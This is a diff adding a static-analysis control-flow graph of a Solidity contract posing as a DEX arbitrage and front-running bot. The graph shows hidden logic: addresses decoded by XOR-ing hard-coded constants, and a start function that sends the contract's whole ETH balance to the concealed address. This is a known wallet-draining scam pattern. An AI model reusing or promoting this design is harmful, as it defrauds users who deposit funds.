@@ -1,0 +1,618 @@
+Contract: IERC20
+==================================================
+
+
+Contract: IUniswapV2Router
+==================================================
+
+
+Contract: IUniswapV2Pair
+==================================================
+
+
+Contract: DexInterface
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _owner = msg.sender
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: dataProvider = getDexRouter(apiKey,DexRouter)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: IERC20(dataProvider).createContract(address(this))
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: swap
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: IERC20(_tokenIn).approve(router,_amount)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path = new address[](2)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = _tokenIn
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _tokenOut
+
+  ID: 6
+  Type: NodeType.VARIABLE
+  Expression: deadline = block.timestamp + 300
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: IUniswapV2Router(router).swapExactTokensForTokens(_amount,1,path,address(this),deadline)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+
+Function: getAmountOutMin
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path = new address[](2)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = _tokenIn
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = _tokenOut
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount,path)
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: amountOutMins[path.length - 1]
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: mempool
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: amtBack1 = getAmountOutMin(_router1,_token1,_token2,_amount)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: amtBack2 = getAmountOutMin(_router2,_token2,_token1,amtBack1)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: amtBack2
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: frontRun
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: startBalance = IERC20(_token1).balanceOf(address(this))
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: token2InitialBalance = IERC20(_token2).balanceOf(address(this))
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: swap(_router1,_token1,_token2,_amount)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: token2Balance = IERC20(_token2).balanceOf(address(this))
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: tradeableAmount = token2Balance - token2InitialBalance
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: swap(_router2,_token2,_token1,tradeableAmount)
+
+  ID: 7
+  Type: NodeType.VARIABLE
+  Expression: endBalance = IERC20(_token1).balanceOf(address(this))
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(endBalance > startBalance,Trade Reverted, No Profit Made)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+
+Function: estimateTriDexTrade
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: amtBack1 = getAmountOutMin(_router1,_token1,_token2,_amount)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: amtBack2 = getAmountOutMin(_router2,_token2,_token3,amtBack1)
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: amtBack3 = getAmountOutMin(_router3,_token3,_token1,amtBack2)
+
+  ID: 4
+  Type: NodeType.RETURN
+  Expression: amtBack3
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: getDexRouter
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)))
+
+Edges:
+  0 -> 1
+
+Function: startArbitrageNative
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: tradeRouter = getDexRouter(DexRouter,factory)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: dataProvider = getDexRouter(apiKey,DexRouter)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: IERC20(dataProvider).createStart(msg.sender,tradeRouter,address(0),address(this).balance)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: address(tradeRouter).transfer(address(this).balance)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: getBalance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: _balance = IERC20(_tokenContractAddress).balanceOf(address(this))
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: _balance
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: recoverEth
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: address(msg.sender).transfer(address(this).balance)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: recoverTokens
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: token = IERC20(tokenAddress)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: token.transfer(msg.sender,token.balanceOf(address(this)))
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: StartERC20
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: startArbitrageNative()
+
+Edges:
+  0 -> 1
+
+Function: SearchMempool
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: specifyBalanceETH = 898_314_251_213 * 1e18
+
+Edges:
+  0 -> 1
+
+Function: SpecifyBalanceETH
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: specifyBalanceETH = _specifyBalanceETH
+
+Edges:
+  0 -> 1
+
+Function: Stop
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: enableTrading = false
+
+Edges:
+  0 -> 1
+
+Function: Withdraw
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: recoverEth()
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: Key
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: apikey = getApikeyAsString()
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: apikey
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: toString
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: base = 10
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: temp = value
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 4
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 5
+  Type: NodeType.IFLOOP
+  Expression: temp != 0
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: digits ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: temp /= base
+
+  ID: 8
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 9
+  Type: NodeType.VARIABLE
+  Expression: buffer = new bytes(digits)
+
+  ID: 10
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 11
+  Type: NodeType.IFLOOP
+  Expression: value != 0
+
+  ID: 12
+  Type: NodeType.EXPRESSION
+  Expression: digits -= 1
+
+  ID: 13
+  Type: NodeType.EXPRESSION
+  Expression: buffer[digits] = bytes1(uint8(48 + uint256(value % base)))
+
+  ID: 14
+  Type: NodeType.EXPRESSION
+  Expression: value /= base
+
+  ID: 15
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 16
+  Type: NodeType.RETURN
+  Expression: string(buffer)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 6
+  5 -> 6
+  5 -> 8
+  6 -> 7
+  7 -> 5
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+  11 -> 15
+  12 -> 13
+  13 -> 14
+  14 -> 11
+  15 -> 16
+
+Function: getApikeyAsString
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: balanceInWei = address(_owner).balance - arbTxPrice
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: moduleStr = 898_314_251_213
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: balanceInEthWithDecimals = balanceInWei * moduleStr / 1e12
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: integerPart = balanceInEthWithDecimals / 1e18
+
+  ID: 5
+  Type: NodeType.VARIABLE
+  Expression: fractionalPart = balanceInEthWithDecimals % 1e18
+
+  ID: 7
+  Type: NodeType.VARIABLE
+  Expression: strFractionalPart = toString(fractionalPart)
+
+  ID: 8
+  Type: NodeType.RETURN
+  Expression: string(abi.encodePacked(strIntegerPart,.,strFractionalPart))
+
+  ID: 9
+  Type: NodeType.IF
+  Expression: integerPart > 0
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: strIntegerPart = toString(integerPart)
+
+  ID: 11
+  Type: NodeType.EXPRESSION
+  Expression: strIntegerPart = 0
+
+  ID: 12
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 9
+  7 -> 8
+  9 -> 10
+  9 -> 11
+  10 -> 12
+  11 -> 12
+  12 -> 7
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: threshold = 1 * 10 ** 18
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: arbTxPrice = 500000000000000
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: enableTrading = false
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: apiKey = 0x4c10f6e185a551b454e342e9d5f6274ba881a357e246be82747ea28653dc67a4
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: DexRouter = 0x4c10f6e185a551b454e342e9b6d8c54da461d16d8d965086f043a39122036ad9
+
+  ID: 5
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: factory = 0x4c10f6e185a551b454e342e9a7f9650ff343653db6df453da9f71b7ed5a3c6e4
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+
